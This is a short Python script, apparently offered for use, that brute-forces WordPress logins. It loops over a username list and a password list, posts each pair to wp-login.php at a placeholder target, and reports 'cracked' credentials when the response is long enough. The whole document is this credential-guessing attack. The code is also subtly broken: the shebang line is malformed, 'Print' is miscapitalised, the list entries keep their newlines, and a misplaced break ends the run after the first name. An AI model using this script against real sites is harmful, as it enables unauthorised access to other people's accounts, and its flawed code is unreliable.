#/bin/python3

import requests

state = 0

# sample_name.txt - saved User Name list 

name = open("sample_name.txt", "r")

name_list = name.readlines()

# passwd_list.txt - saved Password list 

passwd = open("passwd_list.txt","r")

passwd_list = passwd.readlines()

Print("Tony Stark ... You GO >>> ")

for temp1 in name_list:

    for temp2 in passwd_list:
    
        # Change redirect_to parameter to target site
        
        data={'log': temp1, 'pwd': temp2,'wp-submit': 'Log+In', 'redirect_to': 'http://PATH/wp-admin/', 'testcookie': '1'}
        
        custom_cookie = {'wordpress_test_cookie': 'WP+Cookie+check'}
        
        # Change URL to target site
        
        req = requests.post('http://PATH/wp-login.php', data=data, cookies=custom_cookie)
        
        if int(req.headers['Content-Length']) >= 15000:
        
            print(f" !!! Cracked !!! \n User Name : {temp1}\n Password : {temp2}")

            state = 1
        
            break
    
    break

if state == 0:

    print("Unable to crack credentials :( ")
